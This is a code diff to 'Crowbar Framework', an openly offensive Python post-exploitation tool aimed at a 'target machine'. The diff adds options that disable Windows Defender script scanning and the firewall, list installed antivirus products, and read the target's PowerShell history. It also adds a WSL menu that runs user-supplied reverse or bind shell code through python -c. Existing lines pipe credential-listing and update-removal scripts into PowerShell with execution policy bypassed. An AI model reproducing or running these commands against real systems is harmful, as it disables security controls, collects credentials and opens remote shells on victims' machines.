@@ -1,5 +1,5 @@
 # Crowbar Framework
-# 4/24/2021
+# 4/25/2021
 # Made by https://github.com/0x1CA3
 
 import os
@@ -162,6 +162,8 @@ def scripts():
             | 31. scripts/powershell/list_credentials                                         A script that lists credentials.                                |
             | 32. scripts/powershell/remove_update [Nishang]                                  A payload that removes updates for the target machine.          |
             | 33. scripts/powershell/get_unconstrained [Nishang]                              Script that finds machines with Unconstrained Delegation.       |
+            | 34. scripts/extra/cmd/get_architecture                                          Gets the processor architecture.                                |
+            | 35. scripts/extra/cmd/list_antivirus                                            Lists installed AV's on the target machine.                     |
             +—————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
             ''')
         elif scripts == "clear":
@@ -227,6 +229,8 @@ def scripts():
             subprocess.call('''powershell.exe Get-Content scripts/listcredentials.ps1 | PowerShell.exe -noprofile -''', shell=True)
             subprocess.call('''powershell.exe Get-Content scripts/removeupdate.ps1 | PowerShell.exe -noprofile -''', shell=True)
             subprocess.call('''(cd scripts) && (PowerShell.exe -ExecutionPolicy Bypass -File ./getunconstrained.ps1)''', shell=True)
+            os.system("wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%")
+            os.system("cd scripts && list_antivirus.bat")
             print(''' 
             +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
             | Hail mary finished!                                                                                                                        |
@@ -915,6 +919,46 @@ def scripts():
                     leavescripts()
                 else:
                     print("Wrong Command!")
+        elif scripts == "use 34":
+            while True:
+                scriptsgetarchitecture = input("\nScripts (scripts/extra/cmd/get_architecture)\n  |==> ")
+                if scriptsgetarchitecture == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Runs the script against the host machine.                                                                                            |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - goes back to the 'Scripts' directory.                                                                                               |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif scriptsgetarchitecture == "run":
+                    os.system("wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%")
+                elif scriptsgetarchitecture == "clear":
+                    os.system("cls")
+                elif scriptsgetarchitecture == "back":
+                    leavescripts()
+                else:
+                    print("Wrong Command!")
+        elif scripts == "use 35":
+            while True:
+                scriptslistantivirus = input("\nScripts (scripts/extra/cmd/list_antivirus)\n  |==> ")
+                if scriptslistantivirus == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           |
+                    | run - Runs the script against the host machine.                                                                                            |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - goes back to the 'Scripts' directory.                                                                                               |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif scriptslistantivirus == "run":
+                    os.system("cd scripts && list_antivirus.bat")
+                elif scriptslistantivirus == "clear":
+                    os.system("cls")
+                elif scriptslistantivirus == "back":
+                    leavescripts()
+                else:
+                    print("Wrong Command!")
         else:
             print("Wrong Command!")
 
@@ -938,15 +982,20 @@ def util():
             ''')
         elif util == "list":
             print(''' 
-            +——— Utilities —————————————————————————————————————————————————————————————————— Description ————————————————————————————————————————————————————+
-            | 1. util/extra/vmdetect                                                          A utility for VM Detection.                                     |
-            | 2. util/nmap [Nmap must be installed on target machine]                         Runs a port scan against the target.                            |
-            | 3. util/screencapture                                                           Takes a screenshot of the targets screen.                       |
-            | 4. util/extra/avtrigger [Golang must be installed on target machine]            Triggers targets AntiVirus [if enabled] with a video.           |
-            | 5. util/imonitor                                                                A utility for task monitoring.                                  |
-            | 6. util/ipv4                                                                    Grabs IPv4 of target machine.                                   |
-            | 7. util/netcat [NetCat must be installed on the target machine]                 Starts netcat listener.                                         |
-            +—————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+            +———— Utilities —————————————————————————————————————————————————————————————————— Description ————————————————————————————————————————————————————+
+            | 1.  util/extra/vmdetect                                                          A utility for VM Detection.                                     |
+            | 2.  util/nmap [Nmap must be installed on target machine]                         Runs a port scan against the target.                            |
+            | 3.  util/screencapture                                                           Takes a screenshot of the targets screen.                       |
+            | 4.  util/extra/avtrigger [Golang must be installed on target machine]            Triggers targets AntiVirus [if enabled] with a video.           |
+            | 5.  util/imonitor                                                                A utility for task monitoring.                                  |
+            | 6.  util/ipv4                                                                    Grabs IPv4 of target machine.                                   |
+            | 7.  util/netcat [NetCat must be installed on the target machine]                 Starts netcat listener.                                         |
+            | 8.  util/powershell/check_windows_av                                             Checks the status of Windows Defender.                          |
+            | 9.  util/powershell/disable_script_scanning                                      Disables script scanning on the target machine.                 |
+            | 10. util/powershell/list_firewall_blocked_ports                                  List firewall's blocked ports.                                  |
+            | 11. util/powershell/disable_firewall [Windows 7 Only]                            Disables the firewall on the target machine.                    |
+            | 12. util/powershell/get_powershell_history                                       Gets the powershell command history of the target machine.      |
+            +——————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
             ''')
         elif util == "clear":
             functionclear()
@@ -1046,12 +1095,12 @@ def util():
                 utilimonitor = input("\nUtil (util/imonitor)\n  |==> ")
                 if utilimonitor == "help":
                     print(''' 
-                    +——— iMonitor Commands —————————————————————————————————————————————————————————————————— Description ———————————————————————————————————————+
-                    | tasklist                                                                                Lists active procceses.                            |
-                    | forcekill                                                                               Allows you to forcibly kill tasks.                 |
-                    | remotetask                                                                              Allows you to list tasks on a remote computer.     |
-                    | stasks                                                                                  Allows you to query tasks you have access to.      |
-                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    +— iMonitor Commands —————————————————————————————————————————————————————————————————— Description ———————————————————————————————————————+
+                    |  tasklist                                                                             Lists active procceses.                            |
+                    |  forcekill                                                                            Allows you to forcibly kill tasks.                 |
+                    |  remotetask                                                                           Allows you to list tasks on a remote computer.     |
+                    |  stasks                                                                               Allows you to query tasks you have access to.      |
+                    +——————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                     
                     +——— Regular Help Commands ——————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
                     | help - Prints out help commands.                                                                                                           |
@@ -1132,8 +1181,110 @@ def util():
                     leaveutil()
                 else:
                     print("Wrong Command!")
+        elif util == "use 8":
+            while True:
+                utilcheckwindowsav = input("\nUtil (util/powershell/check_windows_av)\n  |==> ")
+                if utilcheckwindowsav == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           | 
+                    | run - Runs utility against the target machine.                                                                                             |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - Goes back to the 'Util' directory.                                                                                                  |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif utilcheckwindowsav == "run":
+                    subprocess.call('''powershell.exe Get-MpComputerStatus''', shell=True)
+                elif utilcheckwindowsav == "clear":
+                    os.system("cls")
+                elif utilcheckwindowsav == "back":
+                    leaveutil()
+                else:
+                    print("Wrong Command!")
+        elif util == "use 9":
+            while True:
+                utildisablescriptscanning = input("\nUtil (util/powershell/disable_script_scanning)\n  |==> ")
+                if utildisablescriptscanning == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           | 
+                    | run - Runs utility against the target machine.                                                                                             |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - Goes back to the 'Util' directory.                                                                                                  |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif utildisablescriptscanning == "run":
+                    subprocess.call('''powershell.exe Set-MpPreference -DisableScriptScanning 1''', shell=True)
+                elif utildisablescriptscanning == "clear":
+                    os.system("cls")
+                elif utildisablescriptscanning == "back":
+                    leaveutil()
+                else:
+                    print("Wrong Command!")
+        elif util == "use 10":
+            while True:
+                utillistfirewallblockedports = input("\nUtil (util/powershell/list_firewall_blocked_ports)\n  |==> ")
+                if utillistfirewallblockedports == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           | 
+                    | run - Runs utility against the target machine.                                                                                             |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - Goes back to the 'Util' directory.                                                                                                  |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif utillistfirewallblockedports == "run":
+                    subprocess.call('''powershell.exe Get-Content util/list_firewall_blocked_ports.ps1 | PowerShell.exe -noprofile -''', shell=True)
+                elif utillistfirewallblockedports == "clear":
+                    os.system("cls")
+                elif utillistfirewallblockedports == "back":
+                    leaveutil()
+                else:
+                    print("Wrong Command!")
+        elif util == "use 11":
+            while True:
+                scriptsdisablefirewall = input("\nUtil (util/powershell/disable_firewall)\n  |==> ")
+                if scriptsdisablefirewall == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           | 
+                    | run - Runs utility against the target machine.                                                                                             |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - Goes back to the 'Util' directory.                                                                                                  |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif scriptsdisablefirewall == "run":
+                    os.system("cd util && powershell.exe ./disable_firewall.ps1")
+                elif scriptsdisablefirewall == "clear":
+                    os.system("cls")
+                elif scriptsdisablefirewall == "back":
+                    leaveutil()
+                else:
+                    print("Wrong Command!")
+        elif util == "use 12":
+            while True:
+                utilgetpowershellcommandhistory = input("\nUtil (util/powershell/get_powershell_history)\n  |==> ")
+                if utilgetpowershellcommandhistory == "help":
+                    print(''' 
+                    +——— Help ———————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    | help - Prints out help commands.                                                                                                           | 
+                    | run - Runs utility against the target machine.                                                                                             |
+                    | clear - Clears the screen.                                                                                                                 |
+                    | back - Goes back to the 'Util' directory.                                                                                                  |
+                    +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+                    ''')
+                elif utilgetpowershellcommandhistory == "run":
+                    subprocess.call('''powershell.exe Get-Content util/get_powershell_history.ps1 | PowerShell.exe -noprofile -''', shell=True)
+                elif utilgetpowershellcommandhistory == "clear":
+                    os.system("cls")
+                elif utilgetpowershellcommandhistory == "back":
+                    leaveutil()
+                else:
+                    print("Wrong Command!")
         else:
             print("Wrong Command!")
+                
+
                     
 
 def icommand():
@@ -1268,6 +1419,49 @@ def escalate():
             print("Wrong Command!")
 
 
+def wsl():
+    while True:
+        wslmenu = input("\nWSL (wsl/)\n  |==> ")
+        if wslmenu == "help" or wslmenu == "list":
+            print(''' 
+            +— WSL Commands —————————————————————————————————————————————————————————————————— Description ———————————————————————————————————————+
+            |  check                                                                           Checks if WSL is installed on the target machine.  |
+            |  who                                                                             Checks what user you're on.                        |
+            |  shell                                                                           Allows you to execute reverse and bind shell code. |
+            |  load                                                                            Loads WSL.                                         |
+            +—————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+
+            +——— Regular Help Commands ——————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+            | help - Prints out help commands.                                                                                                           |
+            | clear - Clears the screen.                                                                                                                 |
+            | back - Goes back to the 'Util' directory.                                                                                                  |
+            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+            ''')
+        elif wslmenu == "check":
+            os.system("wsl uname -a")
+        elif wslmenu == "who":
+            os.system("wsl whoami")
+        elif wslmenu == "shell":
+            wslmenu = input("\nWSL (Enter reverse shell code)\n  |==> ")
+            os.system("python -c '{}'".format(wslmenu))
+        elif wslmenu == "load":
+            print(''' 
+            +——— Message ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+            | To return to the Crowbar Framework, type 'exit'.                                                                                           |
+            +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
+            ''')
+            os.system("wsl")
+        elif wslmenu == "clear":
+            os.system("cls")
+        elif wslmenu == "back":
+            crowbarbanner()
+            mainmenuinput()
+        else:
+            print("Wrong Command!")
+        
+        
+
+
 def mainmenuinput():
     while True:
         mainmenu = input("\nuser@crowbar:~# ")
@@ -1280,6 +1474,7 @@ def mainmenuinput():
             | dir escalate - Goes into the 'Escalate' directory.                                                                                         |
             | command - Loads the 'iCommand' tool for executing OS commands via CMD.                                                                     |
             | power - Loads the 'iPower' tool for executing OS commands via PowerShell.                                                                  |
+            | wsl - Checks if 'Windows Subsystem for Linux' is installed on the target machine. Type 'help' once you enter the 'wsl' menu.               |
             | crowbar - Reloads the framework.                                                                                                           |
             | clear - Clears the screen. (This is for the entire framework)                                                                              |
             +————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
@@ -1294,6 +1489,8 @@ def mainmenuinput():
             icommand()
         elif mainmenu == "power":
             ipower()
+        elif mainmenu == "wsl":
+            wsl()
         elif mainmenu == "crowbar":
             os.system("py main.py")
         elif mainmenu == "clear":
@@ -1313,15 +1510,15 @@ def crowbarbanner():
         ▀            ▀ ▀           █   ▀    
                                   ▀ 
 
-              Welcome {beginmen}
+            Welcome {beginmen}
             to the Crowbar Framework.
     ''')
 
     print(''' 
     +——— Crowbar ——————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————+
     | Version: 3.0                                                                                                                             |
-    | Scripts: 36                                                                                                                              |
-    | Utilities: 7                                                                                                                             |
+    | Scripts: 38                                                                                                                              |
+    | Utilities: 12                                                                                                                            |
     | Made by: https://github.com/0x1CA3                                                                                                       |
     |                                                                                                                                          |
     | Total Online Services: 2                                                                                                                 |
